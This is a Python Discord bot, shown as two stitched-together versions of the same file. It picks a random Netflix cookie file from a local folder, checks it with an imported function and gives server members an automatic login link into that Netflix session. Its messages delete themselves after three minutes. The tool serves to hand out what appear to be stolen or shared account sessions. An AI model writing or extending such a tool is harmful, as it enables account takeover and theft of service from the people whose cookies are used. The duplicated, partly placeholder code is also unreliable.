# bot.py
import os
import json
import random
import asyncio
import logging
from pathlib import Path
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands

from netflix_checker import check_cookie_file

# ------------------------------
# Configuration
# ------------------------------
COOKIES_FOLDER = Path("cookies")
SCRIPT_TIMEOUT = 30
CONFIG_FILE = Path("config.json")          # stores the designated channel ID

# ------------------------------
# Read token from environment variable
# ------------------------------
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_TOKEN")
if not DISCORD_BOT_TOKEN:
    raise ValueError("Missing DISCORD_TOKEN environment variable")

# ------------------------------
# Logging setup
# ------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("NetflixBot")

# ------------------------------
# Persistent config (channel ID)
# ------------------------------
def load_config() -> dict:
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def save_config(config: dict):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_designated_channel_id() -> Optional[int]:
    config = load_config()
    return config.get("channel_id")

def set_designated_channel_id(channel_id: Optional[int]):
    config = load_config()
    if channel_id is None:
        config.pop("channel_id", None)
    else:
        config["channel_id"] = channel_id
    save_config(config)

# ------------------------------
# Bot setup
# ------------------------------
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# ------------------------------
# Helper: send & pin explanation message
# ------------------------------
async def send_pinned_explanation(channel: discord.TextChannel):
    """Send a pinned message explaining how to use the bot, replacing any previous pinned bot message."""
    # Unpin and delete any existing pinned messages sent by this bot
    pinned_messages = await channel.pins()
    for msg in pinned_messages:
        if msg.author == bot.user:
            await msg.unpin()
            await msg.delete()

    embed = discord.Embed(
        title="📺 Netflix Bot – How to use",
        description=(
            "Use the `/create` command in this channel to generate a **private PC login link**.\n"
            "The bot will pick a random cookie file and attempt to create a valid Netflix session.\n\n"
            "**Important:**\n"
            "• The generated link is personal and will be sent to you privately.\n"
            "• If the cookies are expired or invalid, you will be notified.\n"
            "• This bot works only in this designated channel."
        ),
        color=discord.Color.blue()
    )
    embed.set_footer(text="Pinned by bot admin – do not share your link with anyone")
    message = await channel.send(embed=embed)
    await message.pin()

# ------------------------------
# Button view with Yes / No
# ------------------------------
class ConfirmView(discord.ui.View):
    def __init__(self, original_user: discord.User | discord.Member):
        super().__init__(timeout=60)
        self.original_user = original_user

    @discord.ui.button(label="Yes", style=discord.ButtonStyle.green)
    async def yes_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.original_user.id:
            await interaction.response.send_message("❌ This button is not for you.", ephemeral=True)
            return

        # Replace the button message with a "Generating..." status
        await interaction.response.edit_message(content="⏳ **Generating your Netflix link…**", view=None)

        if not COOKIES_FOLDER.exists():
            await interaction.edit_original_response(content="❌ Cookies folder not found. Contact the bot admin.")
            return

        txt_files = list(COOKIES_FOLDER.glob("*.txt"))
        if not txt_files:
            await interaction.edit_original_response(content="❌ No cookie files found in the folder.")
            return

        chosen_file = random.choice(txt_files)
        log.info(f"User {interaction.user} triggered check for file: {chosen_file}")

        try:
            result = await asyncio.wait_for(
                asyncio.to_thread(check_cookie_file, str(chosen_file)),
                timeout=SCRIPT_TIMEOUT
            )
        except asyncio.TimeoutError:
            await interaction.edit_original_response(content="⌛ The check took too long. Please try again later.")
            return
        except Exception as e:
            log.error(f"Checker error: {e}")
            await interaction.edit_original_response(content="⚠️ An unexpected error occurred while processing the file.")
            return

        if result:
            embed = discord.Embed(
                title="✅ PC Login Link Ready",
                description=f"Click the link below to log in automatically:\n\n{result}",
                color=discord.Color.green()
            )
            embed.set_footer(text="This link is personal – do not share it.")
            # Replace the "Generating..." message with the embed
            await interaction.edit_original_response(content=None, embed=embed)

            # Send TV instruction as a followup (ephemeral)
            tv_msg = await interaction.followup.send(
                "📺 You can also run the account on the TV through this link: `netflix.com/tv9` and enter the code for TV.",
                ephemeral=True
            )

            # Schedule auto-deletion of both the embed and the TV instruction after 3 minutes
            asyncio.create_task(auto_delete_messages(interaction, tv_msg))

            log.info(f"Link sent to {interaction.user}")
        else:
            await interaction.edit_original_response(content="❌ The selected cookie file is invalid or expired.")

    @discord.ui.button(label="No", style=discord.ButtonStyle.red)
    async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.original_user.id:
            await interaction.response.send_message("❌ This button is not for you.", ephemeral=True)
            return
        await interaction.response.edit_message(content="❌ Link generation cancelled.", view=None)

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        # Attempt to edit the original message to show timeout
        try:
            await self.message.edit(view=self)
        except:
            pass

async def auto_delete_messages(interaction: discord.Interaction, followup_msg: discord.WebhookMessage):
    """Delete the main response (embed) and the followup TV instruction after 180 seconds."""
    await asyncio.sleep(180)
    try:
        await interaction.delete_original_response()
    except Exception as e:
        log.debug(f"Could not delete original response: {e}")
    try:
        await followup_msg.delete()
    except Exception as e:
        log.debug(f"Could not delete followup message: {e}")

# ------------------------------
# Slash command: /channel (admin only)
# ------------------------------
@bot.tree.command(name="channel", description="Set the text channel where the bot works (admin only)")
@app_commands.default_permissions(manage_guild=True)
@app_commands.describe(channel="The text channel to designate (leave empty to show current channel)")
async def set_channel(interaction: discord.Interaction, channel: Optional[discord.TextChannel] = None):
    if channel is None:
        current_id = get_designated_channel_id()
        if current_id:
            await interaction.response.send_message(f"🔧 The current designated channel is <#{current_id}>.", ephemeral=True)
        else:
            await interaction.response.send_message("🔧 No designated channel has been set yet. Use `/channel #channel` to set one.", ephemeral=True)
        return

    # Set the new channel
    set_designated_channel_id(channel.id)
    await interaction.response.send_message(f"✅ Designated channel set to {channel.mention}.", ephemeral=True)

    # Send and pin the explanation message in the new channel
    await send_pinned_explanation(channel)

# ------------------------------
# Slash command: /create
# ------------------------------
@bot.tree.command(name="create", description="Generate a Netflix PC login link from a random cookie file")
async def create(interaction: discord.Interaction):
    # Verify that the command is used in the designated channel
    designated_id = get_designated_channel_id()
    if designated_id is None:
        await interaction.response.send_message("❌ No channel has been designated for this bot. Ask an admin to use `/channel`.", ephemeral=True)
        return
    if interaction.channel_id != designated_id:
        await interaction.response.send_message(f"❌ This command can only be used in the designated channel <#{designated_id}>.", ephemeral=True)
        return

    embed = discord.Embed(
        title="Netflix Link Generator",
        description="Do you want to generate a PC login link from a random cookie file?",
        color=discord.Color.blue()
    )
    view = ConfirmView(original_user=interaction.user)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
    # Store the message so the view can disable itself on timeout (optional)
    view.message = await interaction.original_response()

# ------------------------------
# Bot events
# ------------------------------
@bot.event
async def on_ready():
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await bot.tree.sync()
        log.info(f"Synced {len(synced)} slash commands")
    except Exception as e:
        log.error(f"Failed to sync commands: {e}")

    # Optional: Re‑send pinned explanation if the designated channel still exists?
    # Not required by the prompt, but adds robustness.
    designated_id = get_designated_channel_id()
    if designated_id:
        channel = bot.get_channel(designated_id)
        if channel and isinstance(channel, discord.TextChannel):
            # Check if the channel already has a pinned message from the bot
            pins = await channel.pins()
            has_bot_pin = any(msg.author == bot.user for msg in pins)
            if not has_bot_pin:
                await send_pinned_explanation(channel)
                log.info(f"Re‑created pinned explanation in {channel.name}")

# ------------------------------
# Run the bot
# ------------------------------
if __name__ == "__main__":
    COOKIES_FOLDER.mkdir(exist_ok=True)
    bot.run(DISCORD_BOT_TOKEN)# bot.py

import os

import random

import asyncio

import logging

from pathlib import Path



import discord

from discord import app_commands

from discord.ext import commands



from netflix_checker import check_cookie_file



# ------------------------------

# Configuration

# ------------------------------

COOKIES_FOLDER = Path("cookies")

SCRIPT_TIMEOUT = 30



# ------------------------------

# Read token from environment variable

# ------------------------------

DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")

if not DISCORD_BOT_TOKEN:

    raise ValueError("Missing DISCORD_BOT_TOKEN environment variable")



# ... rest of the script (unchanged) ...

# ------------------------------

# Logging setup

# ------------------------------

logging.basicConfig(

    level=logging.INFO,

    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"

)

log = logging.getLogger("NetflixBot")



# ------------------------------

# Bot setup

# ------------------------------

intents = discord.Intents.default()

bot = commands.Bot(command_prefix="!", intents=intents)



# ------------------------------

# Button view

# ------------------------------

class CreateLinkView(discord.ui.View):

    def __init__(self, original_user: discord.User | discord.Member):

        super().__init__(timeout=60)

        self.original_user = original_user



    @discord.ui.button(label="Create", style=discord.ButtonStyle.green)

    async def create_button(self, interaction: discord.Interaction, button: discord.ui.Button):

        if interaction.user.id != self.original_user.id:

            await interaction.response.send_message("❌ This button is not for you.", ephemeral=True)

            return



        await interaction.response.send_message("⏳ **Generating your Netflix link…**", ephemeral=True)



        if not COOKIES_FOLDER.exists():

            await interaction.edit_original_response(content="❌ Cookies folder not found. Contact the bot admin.")

            return



        txt_files = list(COOKIES_FOLDER.glob("*.txt"))

        if not txt_files:

            await interaction.edit_original_response(content="❌ No cookie files found in the folder.")

            return



        chosen_file = random.choice(txt_files)

        log.info(f"User {interaction.user} triggered check for file: {chosen_file}")



        try:

            result = await asyncio.wait_for(

                asyncio.to_thread(check_cookie_file, str(chosen_file)),

                timeout=SCRIPT_TIMEOUT

            )

        except asyncio.TimeoutError:

            await interaction.edit_original_response(content="⌛ The check took too long. Please try again later.")

            return

        except Exception as e:

            log.error(f"Checker error: {e}")

            await interaction.edit_original_response(content="⚠️ An unexpected error occurred while processing the file.")

            return



        if result:

            embed = discord.Embed(

                title="✅ PC Login Link Ready",

                description=f"Click the link below to log in automatically:\n\n{result}",

                color=discord.Color.green()

            )

            embed.set_footer(text="This link is personal – do not share it.")

            await interaction.edit_original_response(content=None, embed=embed)

            log.info(f"Link sent to {interaction.user}")

        else:

            await interaction.edit_original_response(content="❌ The selected cookie file is invalid or expired.")



    async def on_timeout(self):

        for item in self.children:

            item.disabled = True



# ------------------------------

# Slash command

# ------------------------------

@bot.tree.command(name="create", description="Generate a Netflix PC login link from a random cookie file")

async def create(interaction: discord.Interaction):

    embed = discord.Embed(

        title="Netflix Link Generator",

        description="Do you want to create a link?",

        color=discord.Color.blue()

    )

    view = CreateLinkView(original_user=interaction.user)

    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)



# ------------------------------

# Bot events

# ------------------------------

@bot.event

async def on_ready():

    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")

    try:

        synced = await bot.tree.sync()

        log.info(f"Synced {len(synced)} slash commands")

    except Exception as e:

        log.error(f"Failed to sync commands: {e}")



# ------------------------------

# Run the bot

# ------------------------------

if __name__ == "__main__":

    COOKIES_FOLDER.mkdir(exist_ok=True)

    bot.run(DISCORD_BOT_TOKEN)
